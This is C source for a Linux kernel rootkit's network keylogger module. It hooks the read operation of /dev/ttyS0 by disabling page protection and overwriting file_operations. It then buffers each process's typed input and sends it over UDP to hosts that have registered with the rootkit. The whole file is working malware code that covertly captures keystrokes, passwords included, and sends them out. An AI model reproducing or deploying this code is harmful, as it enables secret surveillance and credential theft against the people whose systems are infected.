#include "include.h"
#include "network_keylog.h"
#include "udp_server.h"

/* counting accesses to read */
static int accesses_read = 0;

/* read mutex */
struct mutex lock_read;

/* keylogger enabled */
static int keylogging = 0;

/* file of tty */
struct file *file;

/* last task accessing read */
struct task_struct *last_task = NULL;

/* list of hosts communicating with rootkit */
struct data_node *hosts = NULL;

/* list of used processes */
struct data_node *buffers = NULL;

/* backup for original file_op read */
ssize_t (*original_read)(struct file *filp, char __user *buff, size_t count, loff_t *offp);

void release_socket(struct data_node *node) {

	struct host_node *hnode = (struct host_node *)node->data;

	/* release socket */
	sock_release(hnode->sock);
	hnode->sock = NULL;

	/* remove from list */
	delete_data_node(&hosts, node);

	/* still hosts in the list? */
	if(hosts == NULL && keylogging) {

		keylogging = !keylogging;
	}
}

void insert_host(struct sockaddr_in *addr) {

	struct host_node *host = kmalloc(sizeof(struct host_node), GFP_KERNEL);

	debug("[ insert_host ] HOST ADDRESS TO INSERT (%pI4)", &addr->sin_addr.s_addr);

	/* create new socket */
	if(sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &host->sock) < 0) {

		return;
    }

    debug("[ insert_host ] CREATED SOCKET (%pI4, UDP)", &addr->sin_addr.s_addr);

    /* set addr and port */
    memcpy(&host->addr, addr, sizeof(struct sockaddr_in));
    host->addr.sin_port = htons(SYS_PORT);

    /* connect to syslog-ng server */
    if(host->sock->ops->connect(host->sock, (struct sockaddr *)&host->addr, sizeof(struct sockaddr), 0) < 0) {

    	alert("[ insert_host ] SOCKET CONNECT FAILED")

		sock_release(host->sock);
		host->sock = NULL;

    	return;
    }

    debug("[ insert_host ] SOCKET CONNECT (READY TO SEND)");

	debug("[ insert_host ] INSERT HOST ADDRESS %pI4", &addr->sin_addr.s_addr);

    /* insert in host node list */
	insert_data_node(&hosts, (void *)host);

	if(!keylogging) {

		keylogging = !keylogging;
	}
}

void remove_host(struct sockaddr_in *addr) {

	/* find host */
	struct data_node *host = find_data_node_field(&hosts, (void *)addr, offsetof(struct host_node, addr), sizeof(struct sockaddr_in));

	if(host != NULL) {

		debug("[ remove_host ] REMOVE HOST ADDRESS %pI4", &addr->sin_addr.s_addr);

		release_socket(host);

		return;
	}

	debug("[ remove_host ] HOST ADDRESS %pI4 NOT FOUND IN LIST", &addr->sin_addr.s_addr);
}

void flush_buffer_node(int pid, struct buff_node *node) {

	/* zeroing the buffer */
	memset(node->udp_buffer, 0, UDP_BUFF);

	/* set prefix */
	sprintf(node->udp_buffer, "[ NETWORK KEYLOGGER ] [ PID: %d ] ", pid);

	/* set current index */
	node->index = strlen(node->udp_buffer);
}

struct data_node *insert_buff(int pid) {

	struct buff_node *node = kmalloc(sizeof(struct buff_node), GFP_KERNEL);

	debug("[ insert_buff ] INSERT BUFFER FOR PROCESS %d", pid);

	node->pid = pid;

	flush_buffer_node(pid, node);

	return insert_data_node(&buffers, (void *)node);
}

void buffer_prepare_send(struct buff_node *bnode) {

	struct data_node *host = hosts;

	while(host != NULL) {

		struct host_node *hnode = (struct host_node *)host->data;

		debug("[ buffer_prepare_send ] SEND MESSAGE TO %pI4, %d", &hnode->addr.sin_addr.s_addr, SYS_PORT);

		udp_server_send(hnode->sock, &hnode->addr, bnode->udp_buffer, bnode->index);

		host = host->next;
	}

	/* node is going to be removed, clear memory */
	kfree(bnode);
}

ssize_t fake_read(struct file *filp, char __user *buff, size_t count, loff_t *offp) {

	/* original call */
	int ret = (*original_read)(filp, buff, count, offp);

	/* buffer for copying */
	char kbuf[count];

	/* prefix __user implies that the buffer is located in user memory */
	int bytes = copy_from_user(kbuf, buff, count);

	inc_critical(&lock_read, &accesses_read);

	/* bytes == 0 implies that there were no problems copying from user space */
	if(ret >= 1 && bytes == 0) {

		int i, offset;

		/* buffer node for current process */
		struct data_node *node;

		/* keylogger not enabled, quit */
		if(!keylogging) {

			dec_critical(&lock_read, &accesses_read);

			return ret;
		}

		offset = offsetof(struct buff_node, pid);

		/* set new process */
		if(last_task != current) {

			last_task = current;

			node = find_data_node_field(&buffers, (void *)&current->pid, offset, sizeof(current->pid));

			if(node == NULL) {

				node = insert_buff(current->pid);
			}
		}else {

			node = find_data_node_field(&buffers, (void *)&current->pid, offset, sizeof(current->pid));
		}

		/* check for magic word */
		for(i = 0; i < ret; i++) {

			struct buff_node *pbuff = (struct buff_node *)node->data;

			/* copy to log buffer */
			memcpy(pbuff->udp_buffer + pbuff->index, kbuf + i, 1);

			if(kbuf[i] != '\r') {

				pbuff->index++;

				if(pbuff->index == UDP_BUFF - 1) {

					/* buffer length reached, send and flush buffer */
					buffer_prepare_send(pbuff);

					/* reset or remove buffer node */
					delete_data_node(&buffers, node);
				}

			}else{

				/* enter key pressed, send buffer to hosts */
				buffer_prepare_send(pbuff);

				/* reset or remove buffer node */
				delete_data_node(&buffers, node);
			}
		}
	}

	dec_critical(&lock_read, &accesses_read);

	return ret;
}

int network_keylogger_init(void) {

	debug("[ network_keylogger_init ] INITIALIZING KEYLOGGER");

	/* open tty to hook read function */
	file = filp_open("/dev/ttyS0", O_RDONLY, 0);

	/* initialize mutex */
	mutex_init(&lock_read);

	if(file == NULL) {

		return 1;
	}

	/* backup original read function */
	original_read = file->f_op->read;

	disable_page_protection();

	/* override original read */
	((struct file_operations *)file->f_op)->read = (void *)fake_read;

	enable_page_protection();

	return 0;
}

void network_keylogger_exit(void) {

	debug("[ network_keylogger_exit ] EXIT KEYLOGGER");

	/* clear buffer list */
    free_data_node_list(&buffers);

    /* clear hosts list */
    free_data_node_list_callback(&hosts, release_socket);

	disable_page_protection();

	/* reset read function */
	((struct file_operations *)file->f_op)->read = (void *)original_read;

	enable_page_protection();

	/* wait until no process is in fake read */
	while(accesses_read > 0) {

		msleep(50);
	}
}

MODULE_LICENSE("GPL");